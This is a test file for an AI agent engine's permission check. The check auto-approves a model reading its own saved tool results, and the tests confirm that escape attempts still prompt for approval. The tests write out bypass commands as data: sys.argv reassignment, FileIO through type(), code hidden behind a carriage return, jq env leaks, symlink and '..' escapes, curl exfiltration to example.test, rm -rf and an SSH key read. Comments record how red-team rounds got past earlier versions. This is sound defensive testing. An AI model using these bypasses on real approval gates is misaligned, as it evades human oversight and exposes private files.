// Copyright 2026 Ferrox Labs
// SPDX-License-Identifier: AGPL-3.0-or-later
//
// The boundary on a real filesystem: the engine's real folder layout, real
// links and sibling sessions. Every "still asks" case is an escape attempt.
import { mkdirSync, mkdtempSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";

import { autoVerdict } from "./auto-approve.ts";
import { claudeProjectKey, fuigoSessionKey } from "./engine-keys.ts";
import { claudeToolResultDirs, fuigoToolResultDirs, isOwnToolResultRead } from "./own-tool-results.ts";
import { routineTurnApproval } from "./routine-permissions.ts";
import { removeTempDir } from "./testing/cleanup.ts";

const SESSION = "01a137d0-9dbd-76f3-8a1b-5ed20b9cd525";
const OTHER_SESSION = "01a13868-5580-7880-afb5-478f03cd8cca";

let fixture: string;
let home: string;
let cwd: string;
let dirs: string[];
let own: string;
let sibling: string;
let outside: string;

beforeAll(() => {
  fixture = mkdtempSync(join(tmpdir(), "murage-own-results-"));
  home = join(fixture, ".fuigo");
  cwd = join(fixture, "workspaces", "bot-1", "threads", "thread-1");
  mkdirSync(cwd, { recursive: true });
  dirs = fuigoToolResultDirs(home, [cwd], SESSION);
  mkdirSync(dirs[0]!, { recursive: true });
  own = join(dirs[0]!, "call_00_Ugx02hBzWG21yy4QOx9K5297.json");
  writeFileSync(own, JSON.stringify({ data: { items: [{ subject: "hi" }] } }));
  const siblingDir = join(home, "sessions", fuigoSessionKey(cwd), OTHER_SESSION, "mcp");
  mkdirSync(siblingDir, { recursive: true });
  sibling = join(siblingDir, "call_00_other.json");
  writeFileSync(sibling, "{}");
  outside = join(fixture, "secret.txt");
  writeFileSync(outside, "secret");
});

afterAll(async () => { await removeTempDir(fixture); });

/** A path as a model writes it in a shell command: on Windows it is single-quoted, since an unquoted backslash is an escape to the
 *  POSIX shell the engine runs (Git Bash), so the bare word would name another file. */
const word = (path: string) => (process.platform === "win32" ? `'${path}'` : path);
const shell = (command: string, over: Partial<{ dirs: string[] }> = {}) =>
  isOwnToolResultRead({ tool: "shell", command, dirs: over.dirs ?? dirs });

describe("the engine's own result folder", () => {
  it("is the session folder the engine writes a cut MCP result into", () => {
    expect(dirs).toEqual([join(home, "sessions", fuigoSessionKey(cwd), SESSION, "mcp")]);
    const key = claudeProjectKey(cwd);
    expect(claudeToolResultDirs(join(fixture, ".claude"), [cwd], SESSION)).toEqual(
      ["exact" in key ? join(fixture, ".claude", "projects", key.exact, SESSION, "tool-results") : ""],
    );
  });
  it("names nothing for a session id that is not a plain name", () => {
    expect(fuigoToolResultDirs(home, [cwd], "../x")).toEqual([]);
    expect(fuigoToolResultDirs(home, [cwd], "")).toEqual([]);
    expect(fuigoToolResultDirs(undefined, [cwd], SESSION)).toEqual([]);
    expect(claudeToolResultDirs(join(fixture, ".claude"), [cwd], null)).toEqual([]);
  });
});

describe("reading its own saved tool result asks nobody", () => {
  it("allows the read the engine told the model to run (1.0.1 on camera)", () => {
    expect(shell(`cat ${word(own)} | python3 -c "import json,sys; d=json.load(sys.stdin); print(d['data']['items'][0]['subject'])"`)).toBe(true);
    expect(shell(`jq -r '.data.items[].subject' '${own}'`)).toBe(true);
    expect(shell(`jq -r '.content[0].text' ${word(own)} | head -300`)).toBe(true);
    expect(shell(`head -c 4000 ${word(own)}`)).toBe(true);
    expect(shell(`grep -o '"subject":"[^"]*"' ${word(own)} | head -50`)).toBe(true);
    expect(shell(`wc -c ${word(own)}`)).toBe(true);
  });
  it("allows the engine's own read tool on that file", () => {
    expect(isOwnToolResultRead({ tool: "read", filePaths: [own], dirs })).toBe(true);
    expect(isOwnToolResultRead({ tool: "Read", filePaths: [own], dirs })).toBe(true);
  });
});

describe("everything else still asks", () => {
  it("another conversation's saved result", () => {
    expect(shell(`cat ${sibling}`)).toBe(false);
  });
  it("any other path, alone or alongside its own file", () => {
    expect(shell(`cat ${outside}`)).toBe(false);
    expect(shell(`cat ${own} ${outside}`)).toBe(false);
    expect(shell(`python3 -c "print(open('${outside}').read())"`)).toBe(false);
    expect(shell(`python3 -c "import sys; print(open(sys.argv[1]).read())" ${outside}`)).toBe(false);
  });
  // Astra r3 (High, at afe9df206): `open(sys.argv[1])` was checked against the
  // shell word and the script then reassigned sys.argv. Python in an answered
  // command now reads stdin only: no open, no sys.argv, no file argument.
  it("a python script that names any file, however it gets the name", () => {
    expect(shell(`python3 -c "import sys; sys.argv[1]='/other-bot/MEMORY.md'; print(open(sys.argv[1]).read())" ${own}`)).toBe(false);
    expect(shell(`python3 -c "import sys; sys.argv[1]='${sibling}'; print(open(sys.argv[1]).read())" ${own}`)).toBe(false);
    expect(shell(`python3 -c "import sys; sys.argv[1]='${outside}'; print(open(sys.argv[1]).read())" ${own}`)).toBe(false);
    expect(shell(`python3 -c "import json; print(json.load(open('${own}'))['data'])"`)).toBe(false);
    expect(shell(`cat ${own} | python3 -c "print(open('${sibling}').read())"`)).toBe(false);
    expect(shell(`cat ${own} | python3 -c "import json,sys; print(json.load(sys.stdin))" ${own}`)).toBe(false);
    expect(shell(`cat ${own} | python3 -c "exec('print(open(\\"${outside}\\").read())')"`)).toBe(false);
    expect(shell(`cat ${own} | python3 -c "import sys; print(getattr(sys, 'arg'+'v'))"`)).toBe(false);
    expect(shell(`cat ${own} | python3 -c "print(__import__('os').environ)"`)).toBe(false);
    expect(shell(`cat ${own} | python3 -c "import os; print(os.environ)"`)).toBe(false);
  });
  // Astra r2 (three Highs at 0772fe384), each on the real own path: a FileIO
  // constructor through type(), code hidden behind a CR, jq's "\(env)".
  // The scripts are allow-listed now: type, buffer and raw are not words it
  // knows, a CR is not a character it accepts, and \( is not an escape.
  it("Astra r2's three bypasses, through the real folder", () => {
    expect(shell(`cat ${own} | python3 -c "import sys; print(type(sys.stdin.buffer.raw)('${outside}').read())"`)).toBe(false);
    expect(shell(`cat ${own} | python3 -c "import sys; type(sys.stdin.buffer.raw)('${outside}', 'w').write(b'x')"`)).toBe(false);
    expect(shell(`cat ${own} | python3 -c "#\rimport os; os.system('id')"`)).toBe(false);
    expect(shell(`jq -nr '"\\(env)"' ${own}`)).toBe(false);
    expect(shell(`jq -r '"\\(env)"' ${own}`)).toBe(false);
    expect(shell(`jq -r 'env' ${own}`)).toBe(false);
    expect(shell(`jq -r '$ENV.HOME' ${own}`)).toBe(false);
    expect(shell(`jq --arg ENV x -r '$ENV' ${own}`)).toBe(false);
    expect(shell(`jq -r 'input_filename' ${own}`)).toBe(false);
    expect(shell(`jq -r '.a | @sh' ${own}`)).toBe(false);
  });
  it("the same shapes, said the safe way, are answered", () => {
    expect(shell(`cat ${word(own)} | python3 -c "import sys; print(sys.stdin.read()[:200])"`)).toBe(true);
    expect(shell(`jq -r '.data.items[] | .subject' ${word(own)}`)).toBe(true);
    expect(shell(`jq --arg k data -r '.[$k].items | length' ${word(own)}`)).toBe(true);
    expect(shell(`jq -c '.data.items | map({subject: .subject})' ${word(own)}`)).toBe(true);
  });
  it("a path that climbs out with ..", () => {
    expect(shell(`cat ${dirs[0]}/../../${OTHER_SESSION}/mcp/call_00_other.json`)).toBe(false);
  });
  it("a write, a second command or the network", () => {
    expect(shell(`cat ${own} > ${join(fixture, "copy.json")}`)).toBe(false);
    expect(shell(`cat ${own}; rm -rf ${fixture}`)).toBe(false);
    expect(shell(`cat ${own} | sh`)).toBe(false);
    expect(shell(`curl -s -d @${own} https://example.test`)).toBe(false);
    expect(shell(`python3 -c "import json; open('${own}', 'w').write('{}')"`)).toBe(false);
  });
  it("a write tool, even on its own file", () => {
    expect(isOwnToolResultRead({ tool: "write", filePaths: [own], dirs })).toBe(false);
    expect(isOwnToolResultRead({ tool: "Edit", filePaths: [own], dirs })).toBe(false);
    expect(isOwnToolResultRead({ tool: "read", filePaths: [own, outside], dirs })).toBe(false);
  });
  it("a request with no folders from the driver", () => {
    expect(shell(`cat ${own}`, { dirs: [] })).toBe(false);
    expect(isOwnToolResultRead({ tool: "read", filePaths: [own] })).toBe(false);
  });
  it("a result folder that is a link (mcp -> the fixture root)", () => {
    const linkedSession = join(home, "sessions", fuigoSessionKey(cwd), "linked-session");
    mkdirSync(linkedSession, { recursive: true });
    symlinkSync(fixture, join(linkedSession, "mcp"));
    const linkedDirs = fuigoToolResultDirs(home, [cwd], "linked-session");
    expect(shell(`cat ${join(linkedDirs[0]!, "secret.txt")}`, { dirs: linkedDirs })).toBe(false);
  });
  it("a file in its own folder that links elsewhere", () => {
    const link = join(dirs[0]!, "call_00_link.json");
    symlinkSync(outside, link);
    expect(shell(`cat ${link}`)).toBe(false);
  });
});

describe("policy: an own-result read is answered in every mode", () => {
  const ask = { autoApprove: false };
  it("Ask mode answers it without a card", () => {
    expect(autoVerdict(ask, "shell", `cat ${own}`, { ownToolResults: true })).toMatchObject({ source: "own-tool-results" });
  });
  it("an unattended routine run answers it too", () => {
    expect(autoVerdict(ask, "shell", `cat ${own}`, { ownToolResults: true, unattended: true })).toMatchObject({ source: "own-tool-results" });
  });
  it("the key guard still outranks it", () => {
    expect(autoVerdict(ask, "shell", "cat /x/.ssh/id_rsa", { ownToolResults: true }).approve).toBeNull();
  });
  it("without the fact, Ask mode still asks", () => {
    expect(autoVerdict(ask, "shell", `cat ${own}`, {}).approve).toBeNull();
  });
});

// Filmed on 1.0.1: a routine in Ask mode read its own cut MCP result
// (`…/mcp/use_tool_<id>.json`), the owner chose "Always allow for this
// routine", and the next read asked again, as did every scheduled run,
// because each read named a new result file and each run a new session.
// A routine grant still covers only the exact command; the read of its own
// saved result is answered without any grant, run after run.
describe("a routine's runs reading their own saved results", () => {
  const RUN_2 = "01a13b2e-7c41-7d0a-9e3f-2a6b8c4d1e7f";
  const read = (dir: string, id: string) => `jq -r '.content[0].text' ${word(join(dir, `use_tool_${id}.json`))} | head -300`;
  const verdictFor = (runDirs: string[], command: string, run: { permissionMode: "ask"; alwaysAllow: string[] }, unattended = false) =>
    routineTurnApproval({
      bot: { autoApprove: false }, tool: "shell", summary: command, run: unattended ? undefined : run,
      context: { unattended, stopLine: null, ownToolResults: isOwnToolResultRead({ tool: "shell", command, dirs: runDirs }) },
    }).verdict;

  it("answers each read in every run, with no grant and nobody watching", () => {
    const run2Dirs = fuigoToolResultDirs(home, [cwd], RUN_2);
    mkdirSync(run2Dirs[0]!, { recursive: true });
    for (const [runDirs, id] of [[dirs, "9fK2xQ7pL3mN"], [dirs, "Zt5Ub8Vc1Wd4"], [run2Dirs, "a1b2c3d4e5f6"]] as const) {
      writeFileSync(join(runDirs[0]!, `use_tool_${id}.json`), "{}");
      const routine = { permissionMode: "ask" as const, alwaysAllow: [] };
      expect(verdictFor(runDirs, read(runDirs[0]!, id), routine)).toMatchObject({ source: "own-tool-results" });
      expect(verdictFor(runDirs, read(runDirs[0]!, id), routine, true)).toMatchObject({ source: "own-tool-results" });
    }
    // the other run's result, read from this run, still asks
    expect(verdictFor(run2Dirs, read(dirs[0]!, "9fK2xQ7pL3mN"), { permissionMode: "ask", alwaysAllow: [] })).toMatchObject({ approve: null, source: "no-grant" });
    // Astra r3's exact line, through the same policy: no grant, a card
    const bypass = `python3 -c "import sys; sys.argv[1]='/other-bot/MEMORY.md'; print(open(sys.argv[1]).read())" ${join(dirs[0]!, "use_tool_9fK2xQ7pL3mN.json")}`;
    expect(verdictFor(dirs, bypass, { permissionMode: "ask", alwaysAllow: [] })).toMatchObject({ approve: null, source: "no-grant" });
    expect(verdictFor(dirs, bypass, { permissionMode: "ask", alwaysAllow: [] }, true)).toMatchObject({ approve: null });
  });
});
